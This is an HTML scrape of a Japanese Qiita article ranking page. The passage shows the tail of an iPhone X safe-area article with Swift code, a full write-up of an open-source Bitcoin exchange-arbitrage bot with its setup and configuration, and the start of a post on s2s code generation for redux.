<li>Home Indicatorは基本表示されていないとユーザーに混乱を招くため、画像や動画をフルスクリーン表示する際など、<strong>Home Indocatorが被ることでコンテンツの表示に影響が出てしまう場合以外は非表示にしない</strong>ようにする</li>
</ul>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">ViewController.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">import</span> <span class="nc">UIKit</span>

<span class="kd">class</span> <span class="nc">ViewController</span><span class="p">:</span> <span class="bp">UIViewController</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kd">var</span> <span class="nv">isHiddenHomeIndicator</span><span class="p">:</span> <span class="nb">Bool</span> <span class="p">=</span> <span class="kc">true</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">viewDidLoad</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">viewDidLoad</span><span class="p">()</span>

        <span class="k">if</span> <span class="cp">#available</span><span class="p">(</span><span class="cp">iOS</span> <span class="mi">11</span><span class="p">,</span> <span class="o">*</span><span class="p">)</span> <span class="p">{</span> 
            <span class="c1">// HomeIndicatorの表示を更新するためのメソッド</span>
            <span class="cp">setNeedsUpdateOfHomeIndicatorAutoHidden</span><span class="p">()</span> 
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="p">@</span><span class="n">available</span><span class="p">(</span><span class="n">iOS</span> <span class="mi">11</span><span class="p">,</span> <span class="o">*</span><span class="p">)</span>
    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">prefersHomeIndicatorAutoHidden</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="nb">Bool</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">isHiddenHomeIndicator</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/1a91adb8d350fcfd4fcdbf8fc71d4412037c994c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f66636264646633642d663339652d356165362d623537612d6262393135643632383164332e676966" target="_blank" rel="nofollow noopener"><img width="750" alt="Home Indicator Auto Hidden" src="https://camo.qiitausercontent.com/1a91adb8d350fcfd4fcdbf8fc71d4412037c994c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34363232372f66636264646633642d663339652d356165362d623537612d6262393135643632383164332e676966" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/46227/fcbddf3d-f39e-5ae6-b57a-bb915d6281d3.gif"></a></p>

<h1>
<span id="セーフエリアに対応済みのレイアウト系ライブラリ一覧" class="fragment"></span><a href="#%E3%82%BB%E3%83%BC%E3%83%95%E3%82%A8%E3%83%AA%E3%82%A2%E3%81%AB%E5%AF%BE%E5%BF%9C%E6%B8%88%E3%81%BF%E3%81%AE%E3%83%AC%E3%82%A4%E3%82%A2%E3%82%A6%E3%83%88%E7%B3%BB%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E4%B8%80%E8%A6%A7"><i class="fa fa-link"></i></a>セーフエリアに対応済みのレイアウト系ライブラリ一覧</h1>

<ul>
<li>
<a href="https://github.com/robb/Cartography" rel="nofollow noopener" target="_blank">robb/Cartography</a>

<ul>
<li>
<a href="https://github.com/yysskk" rel="nofollow noopener" target="_blank">yysskkさん</a>の<a href="https://github.com/robb/Cartography/pull/267" rel="nofollow noopener" target="_blank">プルリク</a>がマージされたver.<code>2.1.0</code>からサポートされている</li>
</ul>
</li>
<li>
<a href="https://github.com/marty-suzuki/MisterFusion" rel="nofollow noopener" target="_blank">marty-suzuki/MisterFusion</a>

<ul>
<li>開発者本人の<a href="https://github.com/marty-suzuki/MisterFusion/commit/4e22003dd314fca710353b9e11d27434199f7b62" rel="nofollow noopener" target="_blank">コミット</a>が反映されたver.<code>3.1.0</code>からサポートされている</li>
</ul>
</li>
<li>
<a href="https://github.com/SnapKit/SnapKit" rel="nofollow noopener" target="_blank">SnapKit/SnapKit</a>

<ul>
<li>
<a href="http://snapkit.io/docs/" rel="nofollow noopener" target="_blank">公式ドキュメント</a>にて、safeAreaLayoutGuideへの対応方法が追加されている</li>
</ul>
</li>
</ul>

<h1>
<span id="参考リンク一覧" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E3%83%AA%E3%83%B3%E3%82%AF%E4%B8%80%E8%A6%A7"><i class="fa fa-link"></i></a>参考リンク一覧</h1>

<ul>
<li><a href="https://speakerdeck.com/cokaholic/aihuonx-ao-miwoqie-ruka-ao-miwoshi-uka-iphonexdui-ying-falsesusume" rel="nofollow noopener" target="_blank">アイフォンX、凹みを切るか？凹みを使うか？ ~iPhoneX対応のススメ~ - Speaker Deck</a></li>
<li><a href="https://developer.apple.com/videos/play/fall2017/801/" rel="nofollow noopener" target="_blank">Designing for iPhone X - Fall 2017 - Videos - Apple Developer</a></li>
<li><a href="https://developer.apple.com/ios/human-interface-guidelines/overview/iphone-x/" rel="nofollow noopener" target="_blank">iPhone X - Overview - iOS Human Interface Guidelines</a></li>
<li><a href="https://qiita.com/usagimaru/items/761e9a5f3d78b1939df8">iPhone Xのセーフエリアやマージン幅について - Qiita</a></li>
<li><a href="https://qiita.com/hituziando/items/e5873b5bfa42247071e6">【iOS11】safeAreaInsetsの値が取得できるタイミング - Qiita</a></li>
<li><a href="https://qiita.com/marty-suzuki/items/f3dcab7624c9079d74ab">safeAreaInsetsの変更を感知する - Qiita</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">69位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>156</kbd>
		<a target="_blank" href="https://qiita.com/bitrinjani/items/3ed756da9baf7d171306">ビットコイン自動裁定取引システムを開発・トレードした結果</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-16<br />20:53:43</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/202597.html">bitrinjani</a>(7件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/202597/profile-images/1509272555">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> <b>[Node.js]</b> <b>[Bitcoin]</b> <b>[自動売買]</b> <b>[アービトラージ]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="ビットコインをapiで自動売買する" class="fragment"></span><a href="#%E3%83%93%E3%83%83%E3%83%88%E3%82%B3%E3%82%A4%E3%83%B3%E3%82%92api%E3%81%A7%E8%87%AA%E5%8B%95%E5%A3%B2%E8%B2%B7%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>ビットコインをAPIで自動売買する</h1>

<p>ビットコインの自動裁定取引システムのプロトタイプを開発しました。<br>
以下の取引所に対し、3秒ごとに板情報を解析し、裁定機会があれば注文を送信します。</p>

<ul>
<li>Bitflyer</li>
<li>Quoine</li>
<li>Coincheck</li>
</ul>

<p>ソースコードを以下に公開しています。</p>

<ul>
<li>R2(現行バージョン): <a href="https://github.com/bitrinjani/r2" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/bitrinjani/r2</a>
</li>
<li>旧バージョン: <a href="https://github.com/bitrinjani/rinjani" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/bitrinjani/rinjani</a> </li>
</ul>

<p>R2はMac OS, Windows, Linux環境で実行可能です。各取引所に口座開設をし、APIキーを取得すればだれでも実行可能です。ライセンスはMITで、無償で無制限に利用可能です。</p>

<h2>
<span id="裁定アービトラージ取引で収益をあげられるのか" class="fragment"></span><a href="#%E8%A3%81%E5%AE%9A%E3%82%A2%E3%83%BC%E3%83%93%E3%83%88%E3%83%A9%E3%83%BC%E3%82%B8%E5%8F%96%E5%BC%95%E3%81%A7%E5%8F%8E%E7%9B%8A%E3%82%92%E3%81%82%E3%81%92%E3%82%89%E3%82%8C%E3%82%8B%E3%81%AE%E3%81%8B"><i class="fa fa-link"></i></a>裁定(アービトラージ)取引で収益をあげられるのか?</h2>

<p>ビットコインには、取引所間での価格差を利用した裁定機会が残っています。実際に各取引所で配信されている価格をみると、タイミングによってはかなりの価格差があります。</p>

<p>この価格差を利用して、ある取引所で安く買い、同時に他の取引所で高く売れば、Bitcoinの価格変動にかかわらず、リスクなしに収益を得られることになります。</p>

<p>大半のBitcoin取引所はAPIを公開しており、理論的には一瞬の価格差を利用して、自動取引で継続的に収益を上げることが可能です。仮に価格差が非常に小さかったとしても、10秒単位で繰り返し取引を行うことで累積収益は十分に大きくなる可能性があります。</p>

<p>例えば、10秒に一度裁定機会をみつけ、10円の収益を上げる自動裁定システムを開発したとしましょう。一見たった10円に思えるかもしれませんが、秒速1円の収益です。このシステムを24時間一ヶ月間連続で作動させると60*60*24*30 = 2,592,000、つまり250万以上の収益となります。悪く見積もって1分に10円の収益であっても、月45万となります。</p>

<h2>
<span id="実際の実行結果" class="fragment"></span><a href="#%E5%AE%9F%E9%9A%9B%E3%81%AE%E5%AE%9F%E8%A1%8C%E7%B5%90%E6%9E%9C"><i class="fa fa-link"></i></a>実際の実行結果</h2>

<p>以下は実際にこの自動裁定取引システムを実行したときのスクリーン動画です。</p>

<p><a href="https://camo.qiitausercontent.com/d0966fdbcdf45e7eb9760b5750ae0c3a0f2b9084/68747470733a2f2f6d656469612e67697068792e636f6d2f6d656469612f6c33373870664c444c56666b71796b75732f736f757263652e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d0966fdbcdf45e7eb9760b5750ae0c3a0f2b9084/68747470733a2f2f6d656469612e67697068792e636f6d2f6d656469612f6c33373870664c444c56666b71796b75732f736f757263652e676966" alt="rinjani.gif" data-canonical-src="https://media.giphy.com/media/l378pfLDLVfkqykus/source.gif"></a></p>

<p>約30秒で二回の裁定機会を捉え、66円の収益を上げています。取引所の手数料等を差し引いても、秒速1円以上の収益を上げています。</p>

<p>このことから、ビットコイン市場には十分な裁定機会がある、と結論付けることができます。</p>

<p>しかし、実際にしばらく運用した後、長期運用にはいくつかの現実的な手間とコストが発生することが判明しました。それについては後述します。</p>

<h1>
<span id="自動裁定取引システムの動作" class="fragment"></span><a href="#%E8%87%AA%E5%8B%95%E8%A3%81%E5%AE%9A%E5%8F%96%E5%BC%95%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%81%AE%E5%8B%95%E4%BD%9C"><i class="fa fa-link"></i></a>自動裁定取引システムの動作</h1>

<h2>
<span id="裁定取引フロー" class="fragment"></span><a href="#%E8%A3%81%E5%AE%9A%E5%8F%96%E5%BC%95%E3%83%95%E3%83%AD%E3%83%BC"><i class="fa fa-link"></i></a>裁定取引フロー</h2>

<ol>
<li>3秒ごとに各取引所から板情報(価格・数量ペアのリスト)を取得する。</li>
<li>現在のBitcoinポジションのネットエクスポージャーが設定された最大値を超えていないかチェックする。超えている場合、システムを停止する。</li>
<li>各取引所から取得した板情報のうち、裁定取引の対象になりえないものを取り除く。例えば、Bitflyerで現在のポジションが０で、かつ空売りをしない設定の場合、Bitflyerからのビッド(売値)は取り除く。</li>
<li>最良ビッド(売値)、最良アスク(買値)を計算する。もしそのスプレッドが逆転してない場合(買値が売値より高い場合)、裁定機会は存在しないため、ステップ１に戻る。</li>
<li>スプレッドが逆転しているとき、期待収益(仮に最良ビッド/最良アスクで売り買いできたときにどれだけの収益が得られるか)を計算する。その値が設定された目標収益を超えている場合、各取引所に指値注文を送信する。</li>
<li>注文送信後、3秒ごとに各注文が約定したかチェックする。</li>
<li>もし売り買い注文両方が約定した場合、収益を表示しステップ１に戻る。</li>
</ol>

<h2>
<span id="アーキテクチャ概要" class="fragment"></span><a href="#%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a>アーキテクチャ概要</h2>

<p><a href="https://camo.qiitausercontent.com/d20531f62027013e2e439fe51095347e63ad5335/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230323539372f63386262353430312d663866312d363833372d613132322d6332373231356238623661612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d20531f62027013e2e439fe51095347e63ad5335/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230323539372f63386262353430312d663866312d363833372d613132322d6332373231356238623661612e706e67" alt="diagram_ja.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/202597/c8bb5401-f8f1-6837-a122-c27215b8b6aa.png"></a></p>

<h1>
<span id="インストール方法" class="fragment"></span><a href="#%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>インストール方法</h1>

<p>1) <a href="https://nodejs.org" rel="nofollow noopener" target="_blank">Node.js</a> 8.5以降をインストール<br>
2) リポジトリをクローン</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>git clone https://github.com/bitrinjani/r2.git
</pre></div></div>

<p>3) フォルダr2に移動し、<code>npm install</code>をコンソールで実行</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> r2
npm install
</pre></div></div>

<p>4) srcフォルダ内の<code>config_default.json</code>を<code>config.json</code>にリネーム<br>
5) <code>key</code>、<code>secret</code>フィールドを、各取引所から取得したAPIキー、シークレットに置き換える <br>
6) 日本語UIにする場合、<code>language</code>フィールドを"en"から"ja"に変更する<br>
7) コンソールから<code>npm start</code>で起動</p>

<p>なお、旧バージョンは<a href="https://github.com/bitrinjani/rinjani/releases" rel="nofollow noopener" target="_blank">Windwos用のexeファイルを公開</a>しています。いくつかの設定をサポートしていないため、R2(現行バージョン)を利用することをおすすめします。</p>

<h2>
<span id="設定" class="fragment"></span><a href="#%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>設定</h2>

<p>設定は<code>config.json</code>ファイルで行います。全体に影響する設定と、各取引所(ブローカー)に対する設定があります。<br>
設定項目は、裁定取引システムの先駆者である<a href="https://github.com/butor/blackbird" rel="nofollow noopener" target="_blank">Blackbird</a>を参考にしています。</p>

<h3>
<span id="全体設定" class="fragment"></span><a href="#%E5%85%A8%E4%BD%93%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>全体設定</h3>

<table>
<thead>
<tr>
<th>Name</th>
<th>Values</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>demoMode</td>
<td>true or false</td>
<td>真のとき、裁定機会の解析は行うが実際の注文は送らない。</td>
</tr>
<tr>
<td>priceMergeSize</td>
<td>number</td>
<td>板情報の細かい価格を集約する。100に設定されているとき、100円刻みにクオートの数量を合計した板情報を再構成し、その板情報に対し裁定機会の計算を行う。</td>
</tr>
<tr>
<td>maxSize</td>
<td>number</td>
<td>取引所に送る注文数量の最大値。仮にこの値よりも大きい数量で裁定可能であっても、この設定値の注文を送信する。</td>
</tr>
<tr>
<td>minSize</td>
<td>number</td>
<td>取引所に送るオーダー数量の最小値。裁定機会がこの値より小さい数量の場合、取引を行わない。</td>
</tr>
<tr>
<td>minTargetProfit</td>
<td>number</td>
<td>最小目標収益。裁定機会の期待収益がこの値より小さい場合、取引を行わない。</td>
</tr>
<tr>
<td>minTargetProfitPercent(R2のみ)</td>
<td>number</td>
<td>最小目標収益割合。期待収益の裁定取引の円換算(取引価格*数量)に対する割合(%)がこれよりい小さい場合、取引を行わない。minTargetProfitとminTargetProfitPercentの両方が設定されている場合、両方を上回らない限り取引を行わない。</td>
</tr>
<tr>
<td>iterationInterval</td>
<td>Millisecond</td>
<td>裁定プロセスのインターバル。この値が3000に設定されている場合、3秒に一回板情報を取得し裁定機会を探る。</td>
</tr>
<tr>
<td>positionRefreshInterval</td>
<td>Millisecond</td>
<td>ポジション更新インターバル。</td>
</tr>
<tr>
<td>sleepAfterSend</td>
<td>Millisecond</td>
<td>裁定取引完了後、このミリ秒だけ休止する。</td>
</tr>
<tr>
<td>maxNetExposure</td>
<td>number</td>
<td>最大ネットエクスポージャー*。取引所の合計ネットエクスポージャーがこの値を超える場合、システムを停止する。</td>
</tr>
<tr>
<td>maxRetryCount</td>
<td>number</td>
<td>裁定取引のオーダーを送信後、注文の約定状態をチェックする最大回数。</td>
</tr>
<tr>
<td>orderStatusCheckInterval</td>
<td>Millisecond</td>
<td>裁定取引の注文を送信後、注文の約定状態をチェックするインターバル。</td>
</tr>
</tbody>
</table>

<p>*minTargetProfitPercentの例:<br>
minTargetProfitPercent: 0.1%<br>
ベストアスク: 800,000円, 0.3 BTC<br>
ベストビッド: 801,000円, 0.2 BTC<br>
-&gt; MID: 800,500円, 期待収益1,000円、目標数量0.2 BTCとなり、収益の割合は1000 / (800500 * 0.2) = 0.0062、つまり0.62%。<br>
この値はminTargetProfitPercentである0.1%を上回っているので、取引を送信します。</p>

<p>*ここでのネットエクスポージャーとは、各取引所のポジションを合計した"BTC数量"です。一般にはエクスポージャーには数量ではなく割合を指すが、簡略化のため数量としています。例えば、Bitflyerで0.1 BTC, Quoineで0.1 BTC, Coincheckでマイナス0.1 BTC(空売り)のとき、ネットエクスポージャーは 0.1 + 0.1 - 0.1 = 0.1 BTCとなります。仮にMaxNetExposure=0.05と設定されていた場合、0.1 &gt; 0.05のためシステムは停止します。</p>

<h3>
<span id="取引所設定" class="fragment"></span><a href="#%E5%8F%96%E5%BC%95%E6%89%80%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>取引所設定</h3>

<table>
<thead>
<tr>
<th>Name</th>
<th>Values</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>broker</td>
<td>Bitflyer, Quoine or Coincheck</td>
<td>取引所名</td>
</tr>
<tr>
<td>enabled</td>
<td>true or false</td>
<td>裁定取引の対象とするかどうかの設定</td>
</tr>
<tr>
<td>key</td>
<td>string</td>
<td>取引所APIのキーもしくはトークン</td>
</tr>
<tr>
<td>secret</td>
<td>string</td>
<td>取引所APIのシークレット</td>
</tr>
<tr>
<td>maxLongPosition</td>
<td>number</td>
<td>最大ロングポジション</td>
</tr>
<tr>
<td>maxShortPosition</td>
<td>number</td>
<td>最大ショートポジション</td>
</tr>
<tr>
<td>cashMarginType(R2のみ変更可)</td>
<td>Cash, MarginOpen or NetOut</td>
<td>オーダータイプ。現金取引、証拠金取引オープン、ネットアウトのどれか。取引所ごとにサポートしているタイプは異なる。下記テーブルを参照。</td>
</tr>
<tr>
<td>commissionPercent(R2のみ)</td>
<td>number</td>
<td>取引手数料割合。裁定プロセスが予想利益を計算する際、取引手数料(目標価格 * 目標数量 * (commissionPercent / 100))を期待収益から差し引いた上で、取引を送信するか判断する。</td>
</tr>
</tbody>
</table>

<p>*取引所は最低2つ有効になっている必要があります。</p>

<h3>
<span id="cashmargintype詳細" class="fragment"></span><a href="#cashmargintype%E8%A9%B3%E7%B4%B0"><i class="fa fa-link"></i></a>cashMarginType詳細</h3>

<table>
<thead>
<tr>
<th>取引所</th>
<th>サポートされるcashMarginType</th>
</tr>
</thead>
<tbody>
<tr>
<td>Bitflyer</td>
<td>Cash</td>
</tr>
<tr>
<td>Quoine</td>
<td>NetOut</td>
</tr>
<tr>
<td>Coincheck</td>
<td>Cash, MarginOpen, NetOut*</td>
</tr>
</tbody>
</table>

<p>*Coincheckのネットアウトは、取引所APIに存在しない取引タイプのため、アプリケーション内部でどのポジションをクローズするか判断しています。(Quoine APIはネットアウトをネイティブでサポートしています)<br>
CoincheckのcashMarginTypeをNetOutに設定すると、裁定プロセスはオーダーを送信する前に現在のオープンポジションをチェックします。もしほとんど同じサイズのポジションが見つかれば、そのうち最も古いものに対しクローズオーダーを送信します。(FIFO)<br>
ここで「ほとんど同じ」とは、1%以内の差異としています。コインチェックは、0.01 BTCの売注文を出すと、発生するポジションの数量が0.010005 BTCなど微妙に違う値になります。この違いを吸収するために1%の差異を許容しています。</p>

<h1>
<span id="問題点" class="fragment"></span><a href="#%E5%95%8F%E9%A1%8C%E7%82%B9"><i class="fa fa-link"></i></a>問題点</h1>

<h2>
<span id="取引所の証拠金取引レバレッジ取引の可否" class="fragment"></span><a href="#%E5%8F%96%E5%BC%95%E6%89%80%E3%81%AE%E8%A8%BC%E6%8B%A0%E9%87%91%E5%8F%96%E5%BC%95%E3%83%AC%E3%83%90%E3%83%AC%E3%83%83%E3%82%B8%E5%8F%96%E5%BC%95%E3%81%AE%E5%8F%AF%E5%90%A6"><i class="fa fa-link"></i></a>取引所の証拠金取引(レバレッジ取引)の可否</h2>

<p>取引所によっては、証拠金取引が行えないケースがあります。<br>
例えば、Bitflyerは証拠金取引を「ビットコインFX」として提供していますが、ビットコイン現物とはまったく異なる価格帯で取引が行われています。ビットコインFXに対しては、シンプルな価格比較では裁定取引が行なえません。<br>
そのため、Bitflyerに対しては、この自動裁定取引システムはビットコイン現物のみを裁定対象としています。<br>
レバレッジがかけられないと、ショートポジションが取れない、多額の現金が必要になるなど、継続的な裁定取引の障害となります。</p>

<h2>
<span id="取引所のapiのスピード品質" class="fragment"></span><a href="#%E5%8F%96%E5%BC%95%E6%89%80%E3%81%AEapi%E3%81%AE%E3%82%B9%E3%83%94%E3%83%BC%E3%83%89%E5%93%81%E8%B3%AA"><i class="fa fa-link"></i></a>取引所のAPIのスピード、品質</h2>

<p>取引所によっては、APIから指値注文を送信後、10秒以上実際の注文が作成されない場合があります。この現象は特にBitflyerで一時的に発生します。これがAPIインフラの遅延なのか、意図的なものなのかは不明ですが、10秒遅れると約定する見込みはほとんどなくなります。</p>

<p>また、取引所によってAPIの品質に非常に大きなばらつきがあります。今回使用した３社だけでなく、７社の口座を開設しAPIの使用感を確認しました。<br>
使いやすさ、統一性という点では、Bitflyer, Quoineが非常に素晴らしいAPIを提供しています。(上記のようにBitflyerにはスピードの問題がありますが、それはAPI設計ではなくインフラの問題だと思われます)<br>
それに対し、Bitbank, Bitpointなど、価格取得すら安定的にできないレベルのAPIを提供している取引所も多数あります。<br>
より多くの取引所を対象にすれば、より多くの裁定機会を見つけられるはずですが、実際に裁定取引に耐える品質のAPIを提供している取引所は多くありません。</p>

<h2>
<span id="取引所ごとの価格の偏りから派生するポジションの偏り" class="fragment"></span><a href="#%E5%8F%96%E5%BC%95%E6%89%80%E3%81%94%E3%81%A8%E3%81%AE%E4%BE%A1%E6%A0%BC%E3%81%AE%E5%81%8F%E3%82%8A%E3%81%8B%E3%82%89%E6%B4%BE%E7%94%9F%E3%81%99%E3%82%8B%E3%83%9D%E3%82%B8%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%81%8F%E3%82%8A"><i class="fa fa-link"></i></a>取引所ごとの価格の偏りから派生するポジションの偏り</h2>

<p>取引所ごとに、価格の高低に偏りがあります。例えば、Bitflyerは安値になる傾向があり、Quoineは高値になる傾向があります。このとき、裁定取引はBitflyerに対し買いを出し、Quoineに対し売りをだすことになります。そして、この傾向が長期間続くとBitflyerではロングポジションが増大していき、Quoineではショートポジションが増大していきます。</p>

<p>各取引所でポジションが偏ると、その分だけ現金・証拠金が多く必要になります。また、偏りをならすために取引所間でBitcoinを移動する必要が出てきます。Bitcoinの移動の手数料は大きくありませんが、移動後の取引所内で売り買いの決済取引のコストが発生します。決済取引のコストは、その取引所のその時点のスプレッドとなり、１BTCあたり1000円以上になることがあります。</p>

<h1>
<span id="結論" class="fragment"></span><a href="#%E7%B5%90%E8%AB%96"><i class="fa fa-link"></i></a>結論</h1>

<p>自動裁定取引システムである程度の収益を上げることは十分可能です。今後さらに取引所API、取引所システムが洗練されていけば、より効率的に裁定が行えるようになっていくはずです。それに伴い、裁定取引への参入者が増え、各人の裁定収益は減っていくことも予想されます。<br>
品質の悪いAPIを提供している取引所を逆に自分以外への参入障壁とみなし、あえてそこで裁定取引を行うことで独占的利益を得られるかもしれません。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">70位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>152</kbd>
		<a target="_blank" href="https://qiita.com/akameco/items/e1489c6bbf3439ec6ca4">さよならボイラープレート。s2sによる高速reduxアプリケーション構築</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-24<br />03:47:07</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/15319.html">akameco</a>(135件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/15319/profile-images/1473684249">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> <b>[flow]</b> <b>[React]</b> <b>[S2S]</b> <b>[redux]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="まだアクションクリエイターを自分で書いているの" class="fragment"></span><a href="#%E3%81%BE%E3%81%A0%E3%82%A2%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%AF%E3%83%AA%E3%82%A8%E3%82%A4%E3%82%BF%E3%83%BC%E3%82%92%E8%87%AA%E5%88%86%E3%81%A7%E6%9B%B8%E3%81%84%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AE"><i class="fa fa-link"></i></a>まだアクションクリエイターを自分で書いているの？</h2>

<p>reduxとflowtypeを使ってフロントエンドアプリケーションを構築していると、ボイラープレートが多く、面倒だと感じることがありませんか？<br>
しかし、もはや、このAST時代の前には過去の悩みでしかありません。</p>

<p><a href="https://camo.qiitausercontent.com/17aaa035f67e5077867c92c64ea32eee53c42338/68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f616b616d65636f2f7332732d6578616d706c65732f6d61737465722f6d656469612f64656d6f2e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/17aaa035f67e5077867c92c64ea32eee53c42338/68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f616b616d65636f2f7332732d6578616d706c65732f6d61737465722f6d656469612f64656d6f2e676966" alt="demo.gif (1072×586)" data-canonical-src="https://raw.githubusercontent.com/akameco/s2s-examples/master/media/demo.gif"></a></p>

<p>型を書く。それが全てです。<br>
型を書いて、定数を書いて、アクションクリエイターを書いて、一つ変更したら全て変更して、もしくはなんらかのハックを行って型付けして、なんてものは過去のことです。<br>
これからは、アクションクリエイターの作成に5秒以上時間をかけたら<strong>怠惰</strong>でありましょう。そして、これはs2sの1プラグインでしかありません。</p>

<p>プラグインを組み合わせると以下のようなこともできます。</p>

<p><a href="https://camo.qiitausercontent.com/2b3fc744eda2c6e569f437d8006c765c78bc9f20/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f37306239386664642d373338622d646464322d663866352d3932343435353763643734322e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/2b3fc744eda2c6e569f437d8006c765c78bc9f20/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f37306239386664642d373338622d646464322d663866352d3932343435353763643734322e676966" alt="last.gif" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15319/70b98fdd-738b-ddd2-f8f5-9244557cd742.gif"></a></p>

<h2>
<span id="s2s-source-to-source" class="fragment"></span><a href="#s2s-source-to-source"><i class="fa fa-link"></i></a>s2s (Source to Source)</h2>

<p>これを実現している仕組みを<strong>Source to Source</strong>(<strong>s2s</strong>)といいます。</p>

<p><strong>ソースコード</strong>から<strong>ソースコード</strong>への<strong>コーディングタイムコンパイル</strong>です。</p>

<p><a href="https://camo.qiitausercontent.com/ef173c95462bdb477f42a2f6513f67067ad79c92/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f36316162613065322d316161612d343365662d626531312d6566326334613631303561392e706e67" target="_blank" rel="nofollow noopener"><img width="712" alt="スクリーンショット 2017-09-23 23.48.04.png" src="https://camo.qiitausercontent.com/ef173c95462bdb477f42a2f6513f67067ad79c92/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353331392f36316162613065322d316161612d343365662d626531312d6566326334613631303561392e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15319/61aba0e2-1aaa-43ef-be11-ef2c4a6105a9.png"></a></p>

<p>仕組み自体は非常に単純です。プロジェクトをs2sが監視し、条件にマッチしたファイルを引数にBabelを実行します。<br>
Babelに代表されるトランスパイラとs2sの違いは、言葉の通り<strong>出力がソースコードへ返ってくる</strong>点しか違いません。</p>

<p>s2sは概念でありますから、先程のreduxの例のみならず、人が記述可能なものは全て自動で記述できます。例えば、コーディング時にASTに従ってテストコードを自動生成してもいいですし、flowの型定義を書きながらGraphQLのクエリを生成し続けるのもいいでしょう。何より、ボイラープレートだと思われるものは例外なく自動生成可能でしょう。ボイラープレートが忌み嫌われる時代は終わりました。自動生成されるボイラープレートこそが開発に速度とコードの明快さをもたらす福音足り得るでしょう。</p>

